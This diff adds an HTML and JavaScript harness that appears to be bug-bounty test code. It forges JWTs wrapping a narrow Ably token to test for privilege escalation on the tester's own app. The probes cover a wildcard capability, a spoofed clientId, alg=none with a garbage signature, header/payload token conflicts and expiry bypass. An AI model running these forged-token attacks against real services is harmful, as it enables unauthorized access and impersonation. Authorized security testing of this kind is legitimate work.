@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Ably A2.7 harness (own test app only)</title>
+<style>body{font-family:monospace;margin:16px}input{width:420px}pre{background:#f4f4f4;padding:12px;overflow:auto;white-space:pre-wrap}</style>
+</head>
+<body>
+<h3>Ably A2.7 — embedded-JWT outer-claim confusion (own test app bugbountyably only)</h3>
+<p>Paste ROOT API key as <code>name:secret</code>, then click Run. The key is used only in this page to call rest.ably.io; it is never sent anywhere else.</p>
+<input id="key" type="password" placeholder="appId.keyId:secret" autocomplete="off">
+<button id="run">Run A2.7</button>
+<span id="status"></span>
+<pre id="r2s5-results">Not started.
+</pre>
+<script>
+document.getElementById('run').addEventListener('click', async () => {
+  const btn = document.getElementById('run');
+  const status = document.getElementById('status');
+  const pre = document.getElementById('r2s5-results');
+  btn.disabled = true; status.textContent = 'Running...';
+  pre.textContent = 'A2.7 running...\n';
+  const log = (...a) => { const s = a.map(x => typeof x === 'string' ? x : JSON.stringify(x)).join(' '); pre.textContent += s + '\n'; console.log(...a); };
+  const sleep = ms => new Promise(r => setTimeout(r, ms));
+  try {
+    if (typeof Ably === 'undefined') {
+      await new Promise((res, rej) => { const s = document.createElement('script'); s.src = 'https://cdn.ably.com/lib/ably.min-2.js'; s.onload = res; s.onerror = () => rej(new Error('ably.js load failed')); document.head.appendChild(s); });
+    }
+    log('Ably loaded: ' + typeof Ably);
+    const ks = document.getElementById('key').value.trim();
+    if (!ks || ks.indexOf(':') < 0) { log('ABORT: no key'); status.textContent = 'Aborted (no key).'; btn.disabled = false; return; }
+    const ci = ks.indexOf(':'); const ROOT = { name: ks.slice(0, ci), secret: ks.slice(ci + 1) };
+    const REST = 'https://rest.ably.io';
+    const b64url = b => btoa(String.fromCharCode(...new Uint8Array(b))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+    const b64urlStr = s => b64url(new TextEncoder().encode(s));
+    async function hs256(msg, secret) { const k = await crypto.subtle.importKey('raw', new TextEncoder().encode(secret), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']); return b64url(await crypto.subtle.sign('HMAC', k, new TextEncoder().encode(msg))); }
+    async function restCall(method, path, { token = null, key = null, body = null } = {}) { const h = { 'Content-Type': 'application/json' }; if (token) h['Authorization'] = 'Bearer ' + token; if (key) h['Authorization'] = 'Basic ' + btoa(key.name + ':' + key.secret); const r = await fetch(REST + path, { method, headers: h, body: body ? JSON.stringify(body) : null }); const text = await r.text(); let json = null; try { json = JSON.parse(text); } catch {} return { status: r.status, json, text, errCode: r.headers.get('X-Ably-Errorcode') }; }
+    const rest1 = new Ably.Rest({ key: ROOT.name + ':' + ROOT.secret });
+    const narrowTok = (await rest1.auth.requestToken(await rest1.auth.createTokenRequest({ clientId: 'mallory', capability: { 'r2s5-allowed': ['subscribe'] } }))).token;
+    log('narrow token issued (clientId mallory, r2s5-allowed subscribe).');
+    async function embed(inner, { outerClaims = {}, outerHeader = {}, putInPayload = false } = {}) { const now = Math.floor(Date.now() / 1000); const header = { typ: 'JWT', alg: 'HS256', ...(putInPayload ? {} : { 'x-ably-token': inner }), ...outerHeader }; const claims = { iat: now, exp: now + 3600, ...(putInPayload ? { 'x-ably-token': inner } : {}), ...outerClaims }; const u = b64urlStr(JSON.stringify(header)) + '.' + b64urlStr(JSON.stringify(claims)); return u + '.' + await hs256(u, 'attacker-chosen-secret-nobody-verifies'); }
+    async function embedConflict(headerTok, payloadTok, outerClaims = {}) { const now = Math.floor(Date.now() / 1000); const header = { typ: 'JWT', alg: 'HS256', 'x-ably-token': headerTok }; const claims = { iat: now, exp: now + 3600, 'x-ably-token': payloadTok, ...outerClaims }; const u = b64urlStr(JSON.stringify(header)) + '.' + b64urlStr(JSON.stringify(claims)); return u + '.' + await hs256(u, 'attacker-chosen-secret-nobody-verifies'); }
+    let vuln = false;
+    const stop = () => { log('STOP: VULNERABLE result found - halting per plan.'); };
+    let r = await restCall('POST', '/channels/r2s5-forbidden/publish', { token: narrowTok, body: { name: 'x', data: 'pwn' } });
+    log('[C-A2.7a] narrow publish to r2s5-forbidden => status=' + r.status + ' errCode=' + r.errCode + ' body=' + r.text.slice(0, 300) + ' VERDICT: ' + ((r.status === 401 || r.status === 403) ? 'DENY as expected' : 'UNEXPECTED ' + r.status));
+    const plainEmbed = await embed(narrowTok);
+    r = await restCall('POST', '/channels/r2s5-forbidden/publish', { token: plainEmbed, body: { name: 'x', data: 'pwn' } });
+    log('[C-A2.7b] plain embed (no outer claims) publish to r2s5-forbidden => status=' + r.status + ' errCode=' + r.errCode + ' body=' + r.text.slice(0, 300) + ' VERDICT: ' + ((r.status === 401 || r.status === 403) ? 'DENY as expected' : 'UNEXPECTED ' + r.status));
+    const w1 = await embed(narrowTok, { outerClaims: { 'x-ably-capability': JSON.stringify({ '*': ['*'] }) } });
+    r = await restCall('POST', '/channels/r2s5-forbidden/publish', { token: w1, body: { name: 'x', data: 'pwn' } });
+    log('[TEST1] outer x-ably-capability *:* publish to r2s5-forbidden => status=' + r.status + ' errCode=' + r.errCode + ' body=' + r.text.slice(0, 300) + ' VERDICT: ' + (r.status === 201 ? 'VULNERABLE (Critical)' : (r.status === 401 || r.status === 403) ? 'SAFE (DENY)' : 'OTHER ' + r.status));
+    if (r.status === 201) { vuln = true; stop(); }
+    if (!vuln) {
+      const w2 = await embed(narrowTok, { outerClaims: { 'x-ably-clientId': 'alice' } });
+      r = await restCall('POST', '/channels/r2s5-allowed/publish', { token: w2, body: { name: 'x', data: 'from-alice?' } });
+      log('[TEST2] outer x-ably-clientId alice publish to r2s5-allowed => status=' + r.status + ' errCode=' + r.errCode + ' body=' + r.text.slice(0, 300));
+      if (r.status === 201 || r.status === 200) { const h = await restCall('GET', '/channels/r2s5-allowed/messages?limit=5', { key: ROOT }); const msgs = h.json || []; const m = msgs.find(x => x && x.data === 'from-alice?') || msgs[0]; log('[TEST2] history check: found message clientId=' + (m ? m.clientId : '<none>') + ' name=' + (m ? m.name : '') + ' data=' + (m ? m.data : '') + ' VERDICT: ' + ((m && m.clientId === 'alice') ? 'VULNERABLE (clientId spoofed to alice)' : (m && m.clientId === 'mallory') ? 'SAFE (clientId mallory)' : 'UNCLEAR')); if (m && m.clientId === 'alice') { vuln = true; stop(); } } else { log('[TEST2] publish denied => SAFE (rejected) status=' + r.status); }
+    }
+    if (!vuln) {
+      const w3 = await embed(narrowTok, { outerClaims: { 'x-ably-clientType': 'server' } });
+      r = await restCall('GET', '/channels', { token: w3 });
+      log('[TEST3] outer x-ably-clientType server GET /channels => status=' + r.status + ' errCode=' + r.errCode + ' body=' + r.text.slice(0, 300));
+      const rb = await restCall('GET', '/channels', { token: narrowTok });
+      log('[TEST3-baseline] narrow token GET /channels => status=' + rb.status + ' errCode=' + rb.errCode + ' body=' + rb.text.slice(0, 300));
+    }
+    if (!vuln) {
+      const w4a = await embed(narrowTok, { putInPayload: true });
+      r = await restCall('POST', '/channels/r2s5-forbidden/publish', { token: w4a, body: { name: 'x', data: 'pwn' } });
+      log('[TEST4a] x-ably-token in PAYLOAD claim publish to r2s5-forbidden => status=' + r.status + ' errCode=' + r.errCode + ' body=' + r.text.slice(0, 300) + ' VERDICT: ' + (r.status === 201 ? 'VULNERABLE' : (r.status === 401 || r.status === 403) ? 'SAFE (DENY)' : 'OTHER ' + r.status));
+      if (r.status === 201) { vuln = true; stop(); }
+      if (!vuln) {
+        const rootTok = (await rest1.auth.requestToken(await rest1.auth.createTokenRequest({ capability: { '*': ['*'] } }))).token;
+        const w4b = await embedConflict(narrowTok, rootTok);
+        r = await restCall('POST', '/channels/r2s5-forbidden/publish', { token: w4b, body: { name: 'x', data: 'pwn' } });
+        log('[TEST4b] CONFLICT header=narrow payload=root publish to r2s5-forbidden => status=' + r.status + ' errCode=' + r.errCode + ' body=' + r.text.slice(0, 300) + ' VERDICT: ' + (r.status === 201 ? 'VULNERABLE (payload/root token won)' : (r.status === 401 || r.status === 403) ? 'SAFE (header/narrow won or payload ignored)' : 'OTHER ' + r.status));
+        if (r.status === 201) { vuln = true; stop(); }
+      }
+    }
+    if (!vuln) {
+      const mkExp = async (exp) => { const header = { typ: 'JWT', alg: 'HS256', 'x-ably-token': narrowTok }; const claims = { iat: Math.floor(Date.now() / 1000), exp }; const u = b64urlStr(JSON.stringify(header)) + '.' + b64urlStr(JSON.stringify(claims)); return u + '.' + await hs256(u, 'attacker-chosen-secret-nobody-verifies'); };
+      const w5long = await mkExp(Math.floor(Date.now() / 1000) + 7200);
+      r = await restCall('POST', '/channels/r2s5-forbidden/publish', { token: w5long, body: { name: 'x', data: 'pwn' } });
+      log('[TEST5a] outer exp > inner exp (outer +2h, inner 1h) publish to r2s5-forbidden => status=' + r.status + ' errCode=' + r.errCode + ' body=' + r.text.slice(0, 300) + ' (expect REJECT per docs)');
+      const w5short = await mkExp(Math.floor(Date.now() / 1000) + 60);
+      const fresh = await restCall('POST', '/channels/r2s5-forbidden/publish', { token: w5short, body: { name: 'x', data: 'pwn' } });
+      log('[TEST5b-fresh] same short-exp token used immediately => status=' + fresh.status + ' errCode=' + fresh.errCode + ' body=' + fresh.text.slice(0, 200));
+      log('[TEST5b] waiting 61s then reusing expired-outer token...');
+      await sleep(61000);
+      r = await restCall('POST', '/channels/r2s5-forbidden/publish', { token: w5short, body: { name: 'x', data: 'pwn' } });
+      log('[TEST5b] after 61s reuse (outer expired, inner valid) publish to r2s5-forbidden => status=' + r.status + ' errCode=' + r.errCode + ' body=' + r.text.slice(0, 300) + ' VERDICT: ' + ((r.status === 401 || r.status === 403) && r.errCode === fresh.errCode ? 'expiry NOT visibly enforced (same error as fresh) - check realtime attach below' : (r.status === 401 || r.status === 403) ? 'rejected with different error - outer exp may be enforced' : 'OTHER ' + r.status));
+      try { const rt5 = new Ably.Realtime({ token: w5short }); const ch5 = rt5.channels.get('r2s5-allowed'); await ch5.attach(); log('[TEST5b-rt] realtime attach r2s5-allowed with expired-outer token => ATTACHED (expiry bypass VULNERABLE)'); await rt5.close(); } catch (e) { log('[TEST5b-rt] realtime attach r2s5-allowed with expired-outer token => FAILED (outer exp enforced, SAFE): ' + (e && e.message ? e.message : e) + ' code=' + (e && e.code)); }
+    }
+    if (!vuln) {
+      const now6 = Math.floor(Date.now() / 1000);
+      const h6 = b64urlStr(JSON.stringify({ typ: 'JWT', alg: 'none', 'x-ably-token': narrowTok })); const c6 = b64urlStr(JSON.stringify({ iat: now6, exp: now6 + 3600, 'x-ably-capability': JSON.stringify({ '*': ['*'] }) })); const w6 = h6 + '.' + c6 + '.garbage';
+      r = await restCall('POST', '/channels/r2s5-forbidden/publish', { token: w6, body: { name: 'x', data: 'pwn' } });
+      log('[TEST6] outer alg=none + garbage signature + capability *:* publish to r2s5-forbidden => status=' + r.status + ' errCode=' + r.errCode + ' body=' + r.text.slice(0, 300) + ' VERDICT: ' + (r.status === 201 ? 'VULNERABLE (Critical)' : (r.status === 401 || r.status === 403) ? 'SAFE (DENY)' : 'OTHER ' + r.status));
+      if (r.status === 201) { vuln = true; stop(); }
+    }
+    if (!vuln) {
+      try {
+        const rt = new Ably.Realtime({ token: w1 });
+        const ch = rt.channels.get('r2s5-forbidden');
+        await ch.attach();
+        log('[TEST7] realtime attach r2s5-forbidden with TEST1 token => ATTACHED (VULNERABLE confirmation) state=' + ch.state);
+        await rt.close();
+      } catch (e) { log('[TEST7] realtime attach r2s5-forbidden with TEST1 token => FAILED as expected (SAFE): ' + (e && e.message ? e.message : e) + ' code=' + (e && e.code)); }
+    }
+    log('A2.7 DONE. vuln=' + vuln);
+    status.textContent = 'Done. vuln=' + vuln;
+  } catch (e) {
+    log('HARNESS ERROR: ' + (e && e.stack ? e.stack : e));
+    status.textContent = 'Error.';
+  }
+  btn.disabled = false;
+});
+</script>
+</body>
+</html>
